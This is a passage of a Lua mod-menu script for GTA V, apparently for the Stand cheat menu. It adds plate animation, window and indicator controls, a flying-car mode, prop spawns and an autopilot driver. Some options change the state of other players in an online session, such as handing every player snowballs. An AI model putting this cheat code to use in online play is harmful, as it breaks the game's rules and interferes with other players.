local animateinput5 = menu.text_input(animatedplate, "Text 5", {"anitext5"}, "Animated Text 5 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext5)
    animatedtext5 = anitext5
end, animatedtext5)

local animateinput6 = menu.text_input(animatedplate, "Text 6", {"anitext6"}, "Animated Text 6 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext6)
    animatedtext6 = anitext6
end, animatedtext6)

local animateinput7 = menu.text_input(animatedplate, "Text 7", {"anitext7"}, "Animated Text 7 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext7)
    animatedtext7 = anitext7
end, animatedtext7)

local animateinput8 = menu.text_input(animatedplate, "Text 8", {"anitext8"}, "Animated Text 8 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext8)
    animatedtext8 = anitext8
end, animatedtext8)

local animateinput9 = menu.text_input(animatedplate, "Text 9", {"anitext9"}, "Animated Text 9 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext9)
    animatedtext9 = anitext9
end, animatedtext9)

local animateinput10 = menu.text_input(animatedplate, "Text 10", {"anitext10"}, "Animated Text 10 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext10)
    animatedtext10 = anitext10
end, animatedtext10)

local animateinput11 = menu.text_input(animatedplate, "Text 11", {"anitext11"}, "Animated Text 11 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext11)
    animatedtext11 = anitext11
end, animatedtext11)

local animateinput12 = menu.text_input(animatedplate, "Text 12", {"anitext12"}, "Animated Text 12 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext12)
    animatedtext12 = anitext12
end, animatedtext12)

local animateinput13 = menu.text_input(animatedplate, "Text 13", {"anitext13"}, "Animated Text 13 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext13)
    animatedtext13 = anitext13
end, animatedtext13)

local animateinput14 = menu.text_input(animatedplate, "Text 14", {"anitext14"}, "Animated Text 14 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext14)
    animatedtext14 = anitext14
end, animatedtext14)

menu.toggle_loop(animatedplate, "Animate Plate", {"animateplate"}, "Your license plate will be changed to the text you input above on every vehicle you are in.", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
    if (PED.IS_PED_IN_ANY_VEHICLE(p)) then

    if string.len(animatedtext) > 8 then
        animatedtext = ''
    else
	menu.trigger_commands("plate "..animatedtext)
    util.yield(anispeed)
    end
    if string.len(animatedtext2) > 8 then
        animatedtext2 = ''
    else
	menu.trigger_commands("plate "..animatedtext2)
    util.yield(anispeed)
    end
    if string.len(animatedtext3) > 8 then
        animatedtext3 = ''
    else
	menu.trigger_commands("plate "..animatedtext3)
    util.yield(anispeed)
    end
    if string.len(animatedtext4) > 8 then
        animatedtext4 = ''
    else
	menu.trigger_commands("plate "..animatedtext4)
    util.yield(anispeed)
    end
    if string.len(animatedtext5) > 8 then
        animatedtext5 = ''
    else
	menu.trigger_commands("plate "..animatedtext5)
    util.yield(anispeed)
    end
    if string.len(animatedtext6) > 8 then
        animatedtext6 = ''
    else
	menu.trigger_commands("plate "..animatedtext6)
    util.yield(anispeed)
    end
    if string.len(animatedtext7) > 8 then
        animatedtext7 = ''
    else
	menu.trigger_commands("plate "..animatedtext7)
    util.yield(anispeed)
    end
    if string.len(animatedtext8) > 8 then
        animatedtext8 = ''
    else
	menu.trigger_commands("plate "..animatedtext8)
    util.yield(anispeed)
    end
    if string.len(animatedtext9) > 8 then
        animatedtext9 = ''
    else
	menu.trigger_commands("plate "..animatedtext9)
    util.yield(anispeed)
    end
    if string.len(animatedtext10) > 8 then
        animatedtext10 = ''
    else
	menu.trigger_commands("plate "..animatedtext10)
    util.yield(anispeed)
    end
    if string.len(animatedtext11) > 8 then
        animatedtext11 = ''
    else
	menu.trigger_commands("plate "..animatedtext11)
    util.yield(anispeed)
    end
    if string.len(animatedtext12) > 8 then
        animatedtext12 = ''
    else
	menu.trigger_commands("plate "..animatedtext12)
    util.yield(anispeed)
    end
    if string.len(animatedtext13) > 8 then
        animatedtext13 = ''
    else
	menu.trigger_commands("plate "..animatedtext13)
    util.yield(anispeed)
    end
    if string.len(animatedtext14) > 8 then
        animatedtext14 = ''
    else
	menu.trigger_commands("plate "..animatedtext14)
    util.yield(anispeed)
    end

    end
end)

local windows_root = menu.list(uwuvehicle, "Windows", {vcwindows}, "Roll down/disable windows.")

menu.toggle(windows_root, "All Windows", {"rollwinall"}, "", function(wa)
	if wa then
		VEHICLE.ROLL_DOWN_WINDOWS(uwucurveh)
	else
		for i=0,7 do
            VEHICLE.ROLL_UP_WINDOW(uwucurveh, i)
        end
	end
end)
menu.toggle(windows_root, "Front Left", {"rollwinfl"}, "", function(wfl)
	if wfl then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 0)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 0)
	end
end)
menu.toggle(windows_root, "Front Right", {"rollwinfr"}, "", function(wfr)
	if wfr then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 1)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 1)
	end
end)
menu.toggle(windows_root, "Rear Left", {"rollwinrl"}, "", function(wrl)
	if wrl then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 2)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 2)
	end
end)
menu.toggle(windows_root, "Rear Right", {"rollwinrr"}, "", function(wrr)
	if wrr then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 3)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 3)
	end
end)
menu.toggle(windows_root, "Mid Left", {"rollwinml"}, "", function(wml)
	if wml then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 6)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 6)
	end
end)
menu.toggle(windows_root, "Mid Right", {"rollwinmr"}, "", function(wmr)
	if wmr then
		VEHICLE.ROLL_DOWN_WINDOW(uwucurveh, 7)
	else
		VEHICLE.ROLL_UP_WINDOW(uwucurveh, 7)
	end
end)

---------------------------------------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(vehicles, "Aim Passangers", {}, "You can aim passangers in vehicles.", function()
	local localPed = players.user_ped()
	if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
		return
	end
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
	for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
		local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
		if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
			local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
			local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
			PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
		end
	end
end)

menu.toggle_loop(vehicles, "Remove Stickys From Car", {"removestickys"}, "", function(toggle)
    local car = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(PLAYER.PLAYER_PED_ID(player_id), true))
    NETWORK.REMOVE_ALL_STICKY_BOMBS_FROM_ENTITY(car)
    util.yield()
end)

local indicatorsLeftOn = false
local indicatorsRightOn = false
menu.toggle_loop(vehicles, "Indicator Lights", {}, "", function(indactorlightstoggle)
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

            if left and not right and not rear then
                indicatorsLeftOn = true
                indicatorsRightOn = false
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            elseif right and not left and not rear then
                indicatorsLeftOn = false
                indicatorsRightOn = true
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
            elseif rear and not left and not right then
                indicatorsLeftOn = true
                indicatorsRightOn = true
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
            else
                indicatorsLeftOn = false
                indicatorsRightOn = false
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
                VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
            end
    end
end)

    menu.toggle_loop(vehicles, "Play Sounds For Indicator Lights", {"indsounds"}, "Plays extra click sounds when the indicators are on. They will be out of sync, probably. The game already plays click sounds, but these ones are louder.", function()
        if indicatorsLeftOn or indicatorsRightOn then
            AUDIO.PLAY_SOUND(-1, "Faster_Click", "RESPAWN_ONLINE_SOUNDSET", 0, 0, 1)
            util.yield(500)
        end
    end)

menu.action(vehicles, "Random Enhancements", {}, "Only works on vehicles you spawned in for some reason", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("You are not on a vehicle >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

menu.toggle_loop(vehicles, "Random Enhancements (loop)", {}, "Only works on vehicles you spawned in for some reason", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("You are not on a vehicle >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

local bullet_proof

menu.toggle_loop(uwuvehicle, "Bulletproof", {}, "", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

if player_cur_car ~= 0 then
    if everythingproof then
        ENTITY.SET_ENTITY_PROOFS(player_cur_car, true, true, true, true, true, true, true, true)
    end
end

--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "Sportmode", {}, "The SportMode we will all remember from Impusle :'3")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_RO"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_RO"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "Flying with car", {"vehfly"}, "I recommend you put a key to this command.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "Velocity", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(sportmode, "Non-stop", {}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "Reset speed", {}, "If you do not stop moving after turning it off, click here", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "No Collision", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("Sportmode off, not in a vehicle")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Fun Stuff

menu.action(fun, "Random Female Outfit", {}, "Gives You A Random Outfit \n(Can Be Used To Leave Any Bird You Switch Into)", function()
    menu.trigger_commands("mpfemale")
    util.yield(800)
    menu.trigger_commands("randomoutfit")
end)

menu.action(fun, "Random Male Outfit", {}, "Gives You A Random Outfit \n(Can Be Used To Leave Any Bird You Switch Into)", function()
    menu.trigger_commands("mpmale")
    util.yield(800)
    menu.trigger_commands("randomoutfit")
end)

menu.action(fun, "Broomstick Mk2", {""}, "Note: Might Look Weird With Custom Character Models", function()
    local pos = players.get_position(players.user())
    local broomstick = util.joaat("prop_tool_broom")
    local oppressor = util.joaat("oppressor2")
    RequestModel(broomstick)
    RequestModel(oppressor)
    obj = entities.create_object(broomstick, pos)
    veh = entities.create_vehicle(oppressor, pos, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, 0, 0, 0.3, -80.0, 0, 0, true, false, false, false, 0, true) -- thanks to chaos mod for doing the annoying rotation work for me :P
end)

--spawn ramp vehicle--
menu.action(fun, "Spawn Big Ramp Vehicle", {}, "", function()
    local pos = players.get_position(players.user())
    local hash = util.joaat("dune4")
    ent_func.request_model(hash)
    local vehicle = VEHICLE.CREATE_VEHICLE(hash, pos.x ,pos.y ,pos.z, 0, true, false, true)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), vehicle, -1)
    for i = 1, 2 do
        local vehicle_model = ENTITY.GET_ENTITY_MODEL(vehicle)
        local left_vehicle = VEHICLE.CREATE_VEHICLE(vehicle_model, pos.x ,pos.y ,pos.z, ENTITY.GET_ENTITY_HEADING(vehicle), true, false, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(left_vehicle, vehicle, 0, -2*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
        local right_vehicle = VEHICLE.CREATE_VEHICLE(vehicle_model, pos.x ,pos.y ,pos.z, ENTITY.GET_ENTITY_HEADING(vehicle), true, false, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(right_vehicle, vehicle, 0, 2*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
        ENTITY.SET_ENTITY_COLLISION(left_vehicle, true, true)
        ENTITY.SET_ENTITY_COLLISION(right_vehicle, true, true)
    end
end)

menu.action(fun, "Snow War", {}, "Snowball all players in the session.", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("Now everyone has snowballs!")
        util.yield()
    end
   
end)

menu.action(fun, "Take A Massive Shit", {"mshit"}, "Take a massive shit", function()
    local player = players.user_ped()
    local agroup = "missfbi3ig_0"
    local anim = "shit_loop_trev"
    local mshit = util.joaat("prop_big_shit_02")
    local rshit = util.joaat("prop_big_shit_01")
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(mshit, c)
end)

menu.action(fun, "Take A Normal Shit", {"nshit"}, "Take a normale sized shit", function()
    local player = players.user_ped()
    local agroup = "missfbi3ig_0"
    local anim = "shit_loop_trev"
    local mshit = util.joaat("prop_big_shit_02")
    local rshit = util.joaat("prop_big_shit_01")
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(rshit, c)
end)

local jesus_main = menu.list(fun, "Jesus Take The Wheel", {}, "Jesus take the wheeeeeeel!")
local style = 786603
menu.list_action(jesus_main, "Driving Style", {}, "Click to select a style", style_names, function(index, value)
    switch value do
        case "Normal": 
            style = 786603
            break
        case "Semi-Rushed": 
            style = 1074528293
            break
        case "Reverse": 
            style = 1076
            break
        case "Ignore Lights": 
            style = 2883621
            break
        case "Avoid Traffic": 
            style = 786468
            break
        case "Avoid Traffic Extremely": 
            style = 6
            break     
        case "Take Shortest Path":
            style = 262144
            break
        case "Sometimes Overtake Traffic": 
            style = 5
        break  
    end      
end)

local function get_closest_vehicle(entity)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    local vehicles = entities.get_all_vehicles_as_handles()
    -- init this at some ridiculously large number we will never reach, ez
    local closestdist = 1000000
    local closestveh = 0
    for k, veh in pairs(vehicles) do
        if veh ~= PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) and ENTITY.GET_ENTITY_HEALTH(veh) ~= 0 then
            local vehcoord = ENTITY.GET_ENTITY_COORDS(veh, true)
            local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(coords['x'], coords['y'], coords['z'], vehcoord['x'], vehcoord['y'], vehcoord['z'], true)
            if dist < closestdist then
                closestdist = dist
                closestveh = veh
            end
        end
    end
    return closestveh
    end

local speed = 20.00
menu.slider_float(jesus_main, "Driving Speed", {""}, "", 0, 10000, 2000, 100, function(value)
    speed = value / 100
end)

local toggled = false
local jesus_toggle
jesus_toggle = menu.toggle(jesus_main, "Enable", {}, "", function(toggle)
    toggled = toggle
    local pos = players.get_position(players.user())
    local vehicle = entities.get_user_vehicle_as_handle()
    jesus = util.joaat("u_m_m_jesus_01")
    RequestModel(jesus)

    if toggled then
        if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then 
			util.toast(lang.get_localised(-474174214))
            menu.set_value(jesus_toggle, false)
        util.stop_thread() end
        
        jesus_ped = entities.create_ped(26, jesus, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(jesus_ped, vehicle, -1)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
        PED.SET_PED_KEEP_TASK(jesus_ped, true)

        if HUD.IS_WAYPOINT_ACTIVE() then
            local waypoint = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, vehicle, waypoint, speed, style, 0.0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(jesus_ped, vehicle, 20.0, 786603)
            util.toast("Waypoint not found. Jesus will drive you around. :)")
        end
        util.yield()
    else
        if jesus_ped ~= nil then 
            entities.delete_by_handle(jesus_ped)
            PED.SET_PED_INTO_VEHICLE(players.user_ped(), vehicle, -1)
        end
    end
    
    while toggled do
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(vehicle)
        local upright_value = ENTITY.GET_ENTITY_UPRIGHT_VALUE(vehicle)
        if height < 5.0 and upright_value < 0.0 then
            VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle)
        end
        util.yield()
    end
end)

local firework_list = menu.list(fun, "Firework", {}, "")

--kind of fire work--
local effect_name = "scr_mich4_firework_trailburst"
local asset_name = "scr_rcpaparazzo1"
menu.slider(firework_list, "Kind", {}, "", 1, 12, 1, 1, function(count)
    local effects = {
        "scr_mich4_firework_trailburst",
        "scr_indep_firework_air_burst",
        "scr_indep_firework_starburst",
        "scr_indep_firework_trailburst_spawn",
        "scr_firework_indep_burst_rwb",
        "scr_firework_indep_spiral_burst_rwb",
        "scr_firework_indep_ring_burst_rwb",
        "scr_xmas_firework_burst_fizzle",
        "scr_firework_indep_repeat_burst_rwb",
        "scr_firework_xmas_ring_burst_rgw",
        "scr_firework_xmas_repeat_burst_rgw",
        "scr_firework_xmas_spiral_burst_rgw",
    }
    local assets = {
        "scr_rcpaparazzo1",
        "proj_indep_firework",
        "scr_indep_fireworks",
        "scr_indep_fireworks",
        "proj_indep_firework_v2",
